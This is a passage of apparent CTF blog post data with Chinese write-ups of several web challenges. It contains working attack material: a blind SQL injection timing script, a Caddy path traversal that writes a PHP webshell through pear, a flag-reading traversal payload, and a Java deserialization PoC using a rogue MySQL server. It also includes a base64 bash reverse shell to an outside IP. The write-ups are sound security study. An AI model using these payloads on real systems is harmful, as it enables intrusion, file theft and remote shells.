&#x27;&#x27;&#x27;ASCIICHAR_LENGTHCHARACTER_LENGTHCONCATCONCAT_WSFIELDFIND_IN_SETFORMATINSERTINSTRLCASELEFTLENGTHLOCATELOWERLPADLTRIMMIDPOSITIONREPEATREPLACEREVERSERIGHTRPADRTRIMSPACESTRCMPSUBSTRSUBSTRINGSUBSTRING_INDEXTRIMUCASEUPPERABSACOSASINATANATAN2AVGCEILCEILINGCOSCOTCOUNTDEGREESDIVEXPFLOORGREATESTLEASTLNLOGLOG10LOG2MAXMINMODPIPOWPOWERRADIANSRANDROUNDSIGNSINSQRTSUMTANTRUNCATEADDDATEADDTIMECURDATECURRENT_DATECURRENT_TIMECURRENT_TIMESTAMPCURTIMEDATEDATE_ADDDATE_FORMATDATE_SUBDATEDIFFDAYDAYNAMEDAYOFMONTHDAYOFWEEKDAYOFYEAREXTRACTFROM_DAYSHOURLAST_DAYLOCALTIMELOCALTIMESTAMPMAKEDATEMAKETIMEMICROSECONDMINUTEMONTHMONTHNAMENOWPERIOD_ADDPERIOD_DIFFQUARTERSEC_TO_TIMESECONDSTR_TO_DATESUBDATESUBTIMESYSDATETIMETIME_FORMATTIME_TO_SECTIMEDIFFTIMESTAMPTO_DAYSWEEKWEEKDAYWEEKOFYEARYEARYEARWEEKBINBINARYCASECASTCOALESCECandyShop CONNECTION_IDCONVCONVERTCURRENT_USERDATABASEIFIFNULLISNULLLAST_INSERT_IDNULLIFSESSION_USERSYSTEM_USERUSERVERSIONENCRYPTMD5OLD_PASSWORDPASSWORD&#x27;&#x27;&#x27;l = l.split(&quot;\\n&quot;)for i in l: execute(&quot;set @@sql_mode:=(select v from s where k=&#x27;&quot;+k+&quot;&#x27;)/*&quot;+i+&quot;*/;&quot;) 0x02 EasySQLi12345678910111213141516&lt;?phprequire_once(&#x27;db.php&#x27;);highlight_file(__FILE__);set_time_limit(1);$s = floatval(microtime());$order = $_GET[&#x27;order&#x27;] ?? 1;$sql = &quot;SELECT CONCAT(&#x27;RCTF&#123;&#x27;,USER(),&#x27;&#125;&#x27;) AS FLAG WHERE &#x27;🍬关注嘉然🍬&#x27; = &#x27;🍬顿顿解馋🍬&#x27; OR &#x27;🍬Watch Diana a day🍬&#x27; = &#x27;🍬Keep hunger away🍬&#x27; OR &#x27;🍬嘉然に注目して🍬&#x27; = &#x27;🍬食欲をそそる🍬&#x27; ORDER BY $order;&quot;;$stm = $pdo-&gt;prepare($sql);$stm-&gt;execute();echo &quot;Count &#123;$stm-&gt;rowCount()&#125;.&quot;;usleep((1 + floatval(microtime()) - $s) * 1e6);Count 0. order by注入，但是查询得到的row count=0，默认order by 后面的语句不会执行 但在sql语句预处理时，会提前对sql语句进行优化，也就会执行某些语句 再用if判断，构造查询时间差进行判断 NU1L的payload，利用长字符串的拼接构造的时间差，大概的时间差在0.5s左右 12payload=&quot;updatexml(1,if(ascii(substr((&#123;&#125;)&#123;&#125;,1))=&#x27;&#123;&#125;&#x27;,concat(repeat(&#x27;a&#x27;,40000000),repeat(&#x27;a&#x27;,40000000),repeat(&#x27;a&#x27;,40000000),repeat(&#x27;a&#x27;,40000000),repeat(&#x27;b&#x27;,10000000)),1),1)&quot; Redbud的payload 1payload=&quot;updatexml(1,if(ascii(substr((&#123;&#125;)&#123;&#125;,1))=&#x27;&#123;&#125;&#x27;,(select length(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(&#x27;1&#x27;)))))))))))))))))))))))))))))))),1),1)&quot; 也是构造长字符串，但用的是hex，时间差大概在2s左右 脚本就很简单了 123456789101112131415161718import requestsimport stringalp = string.digits+string.ascii_letters+string.punctuation#print(alp)url = &#x27;http://124.71.132.232:11002/&#x27;flag = &#x27;&#x27;for i in range(100): for x in alp: order = &#x27;&#x27;&#x27;updatexml(1,if(substr((select user()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,(select length(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(&#x27;1&#x27;)))))))))))))))))))))))))))))))),1),1)&#x27;&#x27;&#x27;.format(i,x) r = requests.get(url,params=&#123;&#x27;order&#x27;:order&#125;) print(r.elapsed.total_seconds()) if r.elapsed.total_seconds() &gt; 2: flag += x print(flag) break","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"sql注入","slug":"CTF/sql注入","permalink":"https://123-prog.github.io/categories/CTF/sql%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"sqli","slug":"sqli","permalink":"https://123-prog.github.io/tags/sqli/"},{"name":"控制错误信息","slug":"控制错误信息","permalink":"https://123-prog.github.io/tags/%E6%8E%A7%E5%88%B6%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF/"},{"name":"order by 无查询数据 基于时间盲注","slug":"order-by-无查询数据-基于时间盲注","permalink":"https://123-prog.github.io/tags/order-by-%E6%97%A0%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"}]},{"title":"(RCTF2021)VerySafe","slug":"RCTF2021-VerySafe","date":"2021-09-17T14:56:14.000Z","updated":"2021-09-22T10:21:35.732Z","comments":true,"path":"2021/09/17/RCTF2021-VerySafe/","link":"","permalink":"https://123-prog.github.io/2021/09/17/RCTF2021-VerySafe/","excerpt":"0x01 题目第一次看到这样的题，整个题愣是一点代码都没有 给了docker-compose文件","text":"0x01 题目第一次看到这样的题，整个题愣是一点代码都没有 给了docker-compose文件 123456789101112131415version: &#x27;3&#x27;services: caddy: image: caddy:2.4.2 restart: unless-stopped volumes: - ./conf/Caddyfile:/etc/caddy/Caddyfile ports: - &quot;54120:80&quot; php: image: php:7.4-fpm-alpine restart: unless-stopped working_dir: /srv volumes: - ./src:/srv caddy版本为2.4.2，传递script_path给php-fpm的时候可以目录穿越，也就是说，可以尝试让php-fpm解析我们的指定文件 该漏洞2.4.3之后就修复了，可以在https://github.com/caddyserver/caddy/commit/9d4ed3a3236df06e54c80c4f6633b66d68ad3673 看到具体修复 0x02可用的php文件，自己在本地用docker建了个环境，找一下php文件 可以看到，pear扩展包 0x03 写马可以在网上找到pear的用法，其中pear config-create xxx xxx用于创建一个配置文件，第一个参数为home目录，这个参数会出现在配置文件中 所以可以这样写马 1pear config-create &#x2F;tmp&#x2F;&lt;?&#x3D;eval($_POST[1]);?&gt; &#x2F;tmp&#x2F;shell.php 12345678GET &#x2F;..&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;peclcmd.php?+config-create+&#x2F;tmp&#x2F;&lt;?&#x3D;eval($_POST[1]);?&gt;+&#x2F;tmp&#x2F;shell.php HTTP&#x2F;1.1Host: 192.168.231.248:54120Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;93.0.4577.82 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: close 在本地环境测试，shell.php会被创建，而且内容为 成功写码，接下来目录穿越访问就可以了","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"other","slug":"CTF/other","permalink":"https://123-prog.github.io/categories/CTF/other/"}],"tags":[{"name":"caddy+php-fpm目录穿越","slug":"caddy-php-fpm目录穿越","permalink":"https://123-prog.github.io/tags/caddy-php-fpm%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/"},{"name":"利用pear扩展库写马","slug":"利用pear扩展库写马","permalink":"https://123-prog.github.io/tags/%E5%88%A9%E7%94%A8pear%E6%89%A9%E5%B1%95%E5%BA%93%E5%86%99%E9%A9%AC/"}]},{"title":"(RCTF2021) Easyphp","slug":"RCTF2021-Easyphp","date":"2021-09-16T14:04:12.000Z","updated":"2021-09-22T10:21:21.134Z","comments":true,"path":"2021/09/16/RCTF2021-Easyphp/","link":"","permalink":"https://123-prog.github.io/2021/09/16/RCTF2021-Easyphp/","excerpt":"0x01 题目给了源码和nginx配置文件，主要是配置文件，看一下","text":"0x01 题目给了源码和nginx配置文件，主要是配置文件，看一下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849server &#123; listen 80; listen [::]:80; server_name localhost; #access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;host.access.log main; root &#x2F;var&#x2F;www&#x2F;html; location &#x2F;admin &#123; allow 127.0.0.1; deny all; &#125; location &#x2F; &#123; index index.php; try_files $uri @phpfpm; &#125; #error_page 404 &#x2F;404.html; # redirect server error pages to the static page &#x2F;50x.html # error_page 500 502 503 504 &#x2F;50x.html; location &#x3D; &#x2F;50x.html &#123; root &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html; &#125; # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \\.php$ &#123; # proxy_pass http:&#x2F;&#x2F;127.0.0.1; #&#125; # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # location @phpfpm &#123; include fastcgi_params; fastcgi_split_path_info ^(.+?\\.php)(&#x2F;.*)$; fastcgi_pass php:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root&#x2F;index.php; fastcgi_param REQUEST_URI $uri; &#125; # deny access to .htaccess files, if Apache&#39;s document root # concurs with nginx&#39;s one # #location ~ &#x2F;\\.ht &#123; # deny all; #&#125;&#125; 注意几个关键点： 匹配路径/admin会被waf掉，只允许本地访问 传递给fastcgi的参数，SCRIPT_FILENAME写死的，为index.php，就是说，我们访问的任何路径，fastcgi解析的永远都是index.php，index.php中有各种路由负责实现各种功能 REQUEST_URI 设为 $uri，$uri为nginx配置的内置参数，为访问路径，不包含query部分，比如路径http://example.com/test/doc?a=1的$uri就是/test/doc，而且这个参数也会对应php代码中的$_SERVER[&#39;REQUEST_URI&#39;] 0x02 审计$request-&gt;url：目标是访问到/admin，路由下有任意文件读取 123456$app-&gt;route(&#x27;/admin&#x27;, function()&#123; global $app; $request = $app-&gt;request(); $app-&gt;render(&quot;admin&quot;,[&quot;data&quot;=&gt;&quot;./&quot;.$request-&gt;query-&gt;data],&quot;body_content&quot;); $app-&gt;render(&quot;template&quot;,[]);&#125;); 但有很多限制，首先第一个就是nginx配置中的限制，如果我们直接访问/admin，会直接报403 这里就有一个思路，flight的路由解析如果有漏洞的话，是否可以访问某个不是/admin开头的路径，却可以被解析到/admin的路径，这样的话nginx的限制就可以解除了 还有一个限制 12345678910111213$app-&gt;route(&#x27;/*&#x27;, function()&#123; global $app; $request = $app-&gt;request(); $app-&gt;render(&quot;head&quot;,[],&quot;head_content&quot;); if(stristr($request-&gt;url,&quot;login&quot;)!==FALSE)&#123; return true; &#125;else&#123; if($_SESSION[&quot;user&quot;])&#123; return true; &#125; $app-&gt;redirect(&quot;/login&quot;); &#125;&#125;); 这是一个过滤，验证你是否登陆过，但注意到这个if判断，只要$request-&gt;url之中包含login，也就可以绕过 阅读源码，$request-&gt;url来自$_SERVER[&#39;REQUEST_URI&#39;]，初始化的时候会进一步处理，处理为 123if ($this-&gt;base != &#x27;/&#x27; &amp;&amp; strlen($this-&gt;base) &gt; 0 &amp;&amp; strpos($this-&gt;url, $this-&gt;base) === 0) &#123; $this-&gt;url = substr($this-&gt;url, strlen($this-&gt;base));&#125; 也就是说，如果访问路径为/a/aa/aaa，经过处理，这里直接截取了base，就会变成/aaa，即对应$request-&gt;url为/aaa，可以在本地环境中得到验证 route：下面审计以下flight的路由匹配规则 路由函数 1234567891011public function route(Request $request) &#123; $url_decoded = urldecode( $request-&gt;url ); while ($route = $this-&gt;current()) &#123; if ($route !== false &amp;&amp; $route-&gt;matchMethod($request-&gt;method) &amp;&amp; $route-&gt;matchUrl($url_decoded, $this-&gt;case_sensitive)) &#123; return $route; &#125; $this-&gt;next(); &#125; return false; &#125; 首先会对$request-&gt;url进行一次url解码，匹配url的函数为matchUrl，跟进这个函数 发现匹配规则 123456789if (preg_match(&#x27;#^&#x27;.$regex.&#x27;(?:\\?.*)?$#&#x27;.(($case_sensitive) ? &#x27;&#x27; : &#x27;i&#x27;), $url, $matches)) &#123; foreach ($ids as $k =&gt; $v) &#123; $this-&gt;params[$k] = (array_key_exists($k, $matches)) ? urldecode($matches[$k]) : null; &#125; $this-&gt;regex = $regex; return true; &#125; 这里传入的参数为$url，这个参数是一次url解码之后的$request-&gt;url，匹配的话，只要这个以/admin开头，就匹配成功，就会调用对应的回调函数 重点来了，$request-&gt;url在前面分析过，在初始化的时候会经过一个截取，那么如果我们访问/aaa/admin，$request-&gt;url对应的是/admin，flight的路由会调用/admin对应的回调函数，而且/aaa/admin这个路径也不会匹配nginx配置的waf，成功绕过第一个限制 现在我们访问/aaa/admin就可以到admin路由下了，但是因为没有登录，会跳转到login处 login：前面也分析了，只要$request-&gt;url包含login第二个问题也解决了 路由拿到$request-&gt;url参数后的正则匹配是允许后面带有query 虽然我们由于nginx的配置导致$request-&gt;url不会包含query，但如果我们传入路径/aaa/admin%3flogin=1，由于是url编码，服务器解析路径的时候把这一整个都当作路径，而不会认为后面login是参数，所以此时的$request-&gt;url为/admin?login=1，路由匹配可以通过，也达到了$request-&gt;url包含login绕过登录的要求 所以最后的payload为 /aaa/admin%3flogin=1&amp;data=..%252F..%252F..%252F..%252F..%252Fflag 注意data参数中包含的/需要经过两次url编码，否则，$request-&gt;url截取后会变成/flag，主要是保证/admin后没有/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"php代码审计","slug":"CTF/php代码审计","permalink":"https://123-prog.github.io/categories/CTF/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"nginx路径解析绕过","slug":"nginx路径解析绕过","permalink":"https://123-prog.github.io/tags/nginx%E8%B7%AF%E5%BE%84%E8%A7%A3%E6%9E%90%E7%BB%95%E8%BF%87/"},{"name":"flight框架代码审计","slug":"flight框架代码审计","permalink":"https://123-prog.github.io/tags/flight%E6%A1%86%E6%9E%B6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"(羊城杯 2020)A Piece Of Java","slug":"羊城杯-2020-A-Piece-Of-Java","date":"2021-09-06T15:26:05.000Z","updated":"2021-09-22T10:20:49.735Z","comments":true,"path":"2021/09/06/羊城杯-2020-A-Piece-Of-Java/","link":"","permalink":"https://123-prog.github.io/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/","excerpt":"0x01 源码审计主控制器下的路由/hello，存在从外界输入获取序列化数据并进行反序列化的操作","text":"0x01 源码审计主控制器下的路由/hello，存在从外界输入获取序列化数据并进行反序列化的操作 看一下deserialize() 这里的配置文件serialkiller.conf里面设置了白名单 1234&lt;whitelist&gt; &lt;regexp&gt;gdufs\\..*&lt;&#x2F;regexp&gt; &lt;regexp&gt;java\\.lang\\..*&lt;&#x2F;regexp&gt;&lt;&#x2F;whitelist&gt; 序列化只会序列化白名单里的类，这样限制了我们的漏洞利用 注意到/hello路由反序列化了Info类，而且存在一个动态代理 Info是一个接口类，DatabaseInfo和UserInfo实现这个接口，是两个委托类，看一下动态代理类覆写的invoke方法 判断方法名是否为getAllInfo，并且会执行checkAllInfo()，刚好在DatabaseInfo类中的checkAllInfo()存在连接数据库的行为，参数还全都可控 那么我们可以构造poc，构造一个动态代理类实例，代理DatabaseInfo的操作，对其序列化，作为反序列化的数据 /hello路由拿到数据反序列化之后，会调用getAllInfo()方法，因为动态代理的原因，会调用代理中的invoke方法，间接地调用了checkAllInfo()方法连接数据库，而且jdbc的url用的字符串拼接，完全可控 poc.java 1234567891011121314151617181920212223242526272829303132333435363738import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Proxy;import java.util.Base64;import gdufs.challenge.web.invocation.InfoInvocationHandler;import gdufs.challenge.web.model.DatabaseInfo;import gdufs.challenge.web.model.Info;public class poc&#123; public static void main(String[] args) throws IOException&#123; DatabaseInfo dataInfo = new DatabaseInfo(); //实例一个DatabaseInfo类 dataInfo.setHost(&quot;127.0.0.1&quot;); dataInfo.setPort(&quot;3306&quot;); //设置为远程主机的ip:port dataInfo.setUsername(&quot;fileread_/flag_AQUA&quot;); dataInfo.setPassword(&quot;123&amp;allowLoadLocalInfile=true&amp;allowUrlInLocalInfile=true&quot;); //通过Username和Password控制jdbc的url ClassLoader classLoader = dataInfo.getClass().getClassLoader(); Class[] interfaces = dataInfo.getClass().getInterfaces(); InfoInvocationHandler infoInvocationHandler = new InfoInvocationHandler(dataInfo); Info proxy = (Info) Proxy.newProxyInstance(classLoader, interfaces, infoInvocationHandler); //新建动态代理实例，需要获取委托类的ClassLoader和接口数组，将DatabaseInfo的实例作为参数传入 //InfoInvocationHandler构造函数获取代理实例，最后拿到proxy，通过代理调用委托类的方法，会调用代 //理类覆写的invoke方法作为代替 ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(baos); objectOutputStream.writeObject(proxy); objectOutputStream.flush(); objectOutputStream.close(); System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray()))); //序列化数据 &#125;&#125; 拿到base64串作为cookie的data值，即可实现对任意mysql服务端的连接 0x02 解法一：mysql恶意服务端读取文件利用工具在vps上构造恶意mysql服务端 https://github.com/fnmsd/MySQL_Fake_Server 构造恶意mysql服务端，令连接客户端发送其本地文件内容到服务端，实现任意读取文件 例如，这里直接写jdbc的url作为例子 jdbc:mysql://127.0.0.1:3306/jdbc?user=fileread_/etc/passwd&amp;password=xxx&amp;allowLoadLocalInfile=true jdbc:mysql://127.0.0.1:3306/jdbc?user=fileread_file:///&amp;password=xxx&amp;allowLoadLocalInfile=true&amp;allowUrlInLocalInfile=true allowLoadLocalInfile为mysql jdbc的配置选项，允许mysql使用LOAD DATA LOCAL INFILE ...读取文件，否则可能读取不到文件内容 allowUrlInLocalInfile也是配置项，顾名思义，打开的话，允许在LOAD DATA LOCAL INFILE ...解析urls，各种协议都可以尝试，可以使用http实现SSRF，或者file协议读取文件，目录结构，如上例子2 所以解法一就是利用恶意服务端读取根目录结构，发现flag文件直接读 构造jdbc url 1&#96;jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;jdbc?user&#x3D;fileread_file:&#x2F;&#x2F;&#x2F;&amp;password&#x3D;xxx&amp;allowLoadLocalInfile&#x3D;true&amp;allowUrlInLocalInfile&#x3D;true&#96; 读取根目录结构 发现flag文件，更改jdbc url 1jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;jdbc?user&#x3D;fileread_&#x2F;flag_AQUA&amp;password&#x3D;xxx&amp;allowLoadLocalInfile&#x3D;true 读取flag 0x02 解法二：mysql恶意服务端+java反序列化mysql恶意服务端不仅仅可以读取客户端文件，还可以让客户端对服务端数据进行反序列化触发java反序列化漏洞 mysql-connector的版本不一样，触发反序列化的点就不一样，如下 123456789101112131415161718192021ServerStatusDiffInterceptor触发8.x: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc6.x(属性名不同): jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc5.1.11及以上的5.x版本（包名没有了cj）: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc5.1.10及以下的5.1.X版本： 同上，但是需要连接后执行查询。5.0.x: 还没有ServerStatusDiffInterceptor这个东西┓( ´∀&#96; )┏detectCustomCollations触发：5.1.41及以上: 不可用5.1.29-5.1.40: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc5.1.28-5.1.19： jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc5.1.18以下的5.1.x版本： 不可用5.0.x版本不可用 看一下依赖，是8.0.19版本 12345&lt;dependency&gt; &lt;groupId&gt;mysql&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;&#x2F;artifactId&gt; &lt;version&gt;8.0.19&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt; 所以触发反序列化的payload应该像下面一样 1jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc 同样使用上面的恶意Mysql服务端 构造用户名为yso_CommonsCollections5_command，command换成弹shell的命令就可以，这里用到了ysoserial中的cc5链，因为在依赖中serialkiller为3.0版本，查看对应依赖，可以发现Commons-Collections 3.2.1的依赖，对应利用链cc5，ysoserial下载地址https://github.com/angelwhu/ysoserial，在恶意mysql目录下的`config.json`文件配置ysoserial路径 poc.java 123456789101112131415161718192021222324252627282930313233343536import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Proxy;import java.util.Base64;import gdufs.challenge.web.invocation.InfoInvocationHandler;import gdufs.challenge.web.model.DatabaseInfo;import gdufs.challenge.web.model.Info;public class poc&#123; public static void main(String[] args) throws IOException&#123; DatabaseInfo dataInfo = new DatabaseInfo(); dataInfo.setHost(&quot;xxx.xxx.xxx.xxx&quot;); dataInfo.setPort(&quot;3306&quot;); dataInfo.setUsername(&quot;yso_CommonsCollections5_bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjEuMzcuMTAuMjU0LzEwMDAgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D&quot;); //yso_CommonsCollections5_command，告诉伪造mysql服务用的那一条链 dataInfo.setPassword(&quot;123&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;); //触发反序列化的配置 ClassLoader classLoader = dataInfo.getClass().getClassLoader(); Class[] interfaces = dataInfo.getClass().getInterfaces(); InfoInvocationHandler infoInvocationHandler = new InfoInvocationHandler(dataInfo); Info proxy = (Info) Proxy.newProxyInstance(classLoader, interfaces, infoInvocationHandler); //老三样 ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(baos); objectOutputStream.writeObject(proxy); objectOutputStream.flush(); objectOutputStream.close(); System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray()))); &#125;&#125; 1rO0ABXN9AAAAAgAUamF2YS5pby5TZXJpYWxpemFibGUAHmdkdWZzLmNoYWxsZW5nZS53ZWIubW9kZWwuSW5mb3hyABdqYXZhLmxhbmcucmVmbGVjdC5Qcm94eeEn2iDMEEPLAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjt4cHNyADRnZHVmcy5jaGFsbGVuZ2Uud2ViLmludm9jYXRpb24uSW5mb0ludm9jYXRpb25IYW5kbGVyY59H&#x2F;KdZhO8CAAFMAARpbmZvdAAgTGdkdWZzL2NoYWxsZW5nZS93ZWIvbW9kZWwvSW5mbzt4cHNyACZnZHVmcy5jaGFsbGVuZ2Uud2ViLm1vZGVsLkRhdGFiYXNlSW5mb19JEpYnRJPdAgAFTAAKY29ubmVjdGlvbnQAFUxqYXZhL3NxbC9Db25uZWN0aW9uO0wABGhvc3R0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgAJTAAEcG9ydHEAfgAJTAAIdXNlcm5hbWVxAH4ACXhwcHQADTEyMS4zNy4xMC4yNTR0AGUxMjMmYXV0b0Rlc2VyaWFsaXplPXRydWUmcXVlcnlJbnRlcmNlcHRvcnM9Y29tLm15c3FsLmNqLmpkYmMuaW50ZXJjZXB0b3JzLlNlcnZlclN0YXR1c0RpZmZJbnRlcmNlcHRvcnQABDMzMDZ0AJl5c29fQ29tbW9uc0NvbGxlY3Rpb25zNV9iYXNoJTIwLWMlMjAlN0JlY2hvJTJDWW1GemFDQXRhU0ElMkJKaUF2WkdWMkwzUmpjQzh4TWpFdU16Y3VNVEF1TWpVMEx6RXdNREFnTUQ0bU1RJTNEJTNEJTdEJTdDJTdCYmFzZTY0JTJDLWQlN0QlN0MlN0JiYXNoJTJDLWklN0Q&#x3D; 作为cookie中的data值 执行，mysql服务端收到连接，发送相应payload 成功反弹shell","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"java web","slug":"CTF/java-web","permalink":"https://123-prog.github.io/categories/CTF/java-web/"}],"tags":[{"name":"mysql恶意服务端读取客户端文件","slug":"mysql恶意服务端读取客户端文件","permalink":"https://123-prog.github.io/tags/mysql%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6/"},{"name":"java反序列化","slug":"java反序列化","permalink":"https://123-prog.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java动态代理知识","slug":"java动态代理知识","permalink":"https://123-prog.github.io/tags/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E7%9F%A5%E8%AF%86/"}]},{"title":"(2021祥云杯)cralwer_z","slug":"2021祥云杯-cralwer-z","date":"2021-09-01T14:24:37.000Z","updated":"2021-09-22T10:20:30.681Z","comments":true,"path":"2021/09/01/2021祥云杯-cralwer-z/","link":"","permalink":"https://123-prog.github.io/2021/09/01/2021%E7%A5%A5%E4%BA%91%E6%9D%AF-cralwer-z/","excerpt":"0x01给了源码，正常注册，登录后进入路由/user /profile用于展示和更改User信息，可以更改User.bucket，但这里是初步更改","text":"0x01给了源码，正常注册，登录后进入路由/user /profile用于展示和更改User信息，可以更改User.bucket，但这里是初步更改 1234567await User.update(&#123; affiliation, age, personalBucket: bucket &#125;, &#123; where: &#123; userId: req.session.userId &#125; &#125;); 这里并没有直接更改User的bucket信息，而是先存放在personalBucket中，后面更改的时候还要验证一下token 这里正常更改的话会有过滤，必须符合正则匹配 /^https:\\/\\/[a-f0-9]&#123;32&#125;\\.oss-cn-beijing\\.ichunqiu\\.com\\/$/ 但可以通过其他方式，先更改personalBucket，这时候肯定是不符合正则的，程序就不会进行跳转更改，但我们可以自己拿token在verify路由下更改，主要是token要符合要求 /verify可以说才是真正更改bucket的地方，看一下代码 123456789101112131415161718192021222324252627282930313233router.get(&#x27;/verify&#x27;, async (req, res, next) =&gt; &#123; let &#123; token &#125; = req.query; if (!token || typeof (token) !== &quot;string&quot;) &#123; return res.send(&quot;Parameters error&quot;); &#125; let user = await User.findByPk(req.session.userId); const result = await Token.findOne(&#123; token, userId: req.session.userId, valid: true &#125;); if (result) &#123; try &#123; await Token.update(&#123; valid: false &#125;, &#123; where: &#123; userId: req.session.userId &#125; &#125;); await User.update(&#123; bucket: user.personalBucket &#125;, &#123; where: &#123; userId: req.session.userId &#125; &#125;); user = await User.findByPk(req.session.userId); return res.render(&#x27;user&#x27;, &#123; user, message: &quot;Successfully update your bucket from personal bucket!&quot; &#125;); &#125; catch (err) &#123; next(createError(500)); &#125; &#125; else &#123; user = await User.findByPk(req.session.userId); return res.render(&#x27;user&#x27;, &#123; user, message: &quot;Failed to update, check your token carefully&quot; &#125;) &#125;&#125;) 上面验证token应该是出现了非预期 12345const result &#x3D; await Token.findOne(&#123; token, userId: req.session.userId, valid: true &#125;); token应该为token:token 导致只要token存在就可以，valid就无关紧要了 所以现在可以不受限制更改bucket，步骤是，先提交符合要求的bucket拿到有效token，然后提交不符合要求的bucket，也就是目标bucket，这样User中的personalBucket就是目标bucket，然后访问/user/verify?token=xxx，就可以更改bucket了 0x02利用zombie进行RCE 路由/user/bucket 123456789101112131415161718192021222324router.get(&#39;&#x2F;bucket&#39;, async (req, res) &#x3D;&gt; &#123; const user &#x3D; await User.findByPk(req.session.userId); if (&#x2F;^https:\\&#x2F;\\&#x2F;[a-f0-9]&#123;32&#125;\\.oss-cn-beijing\\.ichunqiu\\.com\\&#x2F;$&#x2F;.exec(user.bucket)) &#123; return res.json(&#123; message: &quot;Sorry but our remote oss server is under maintenance&quot; &#125;); &#125; else &#123; &#x2F;&#x2F; Should be a private site for Admin try &#123; const page &#x3D; new Crawler(&#123; userAgent: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.212 Safari&#x2F;537.36&#39;, referrer: &#39;https:&#x2F;&#x2F;www.ichunqiu.com&#x2F;&#39;, 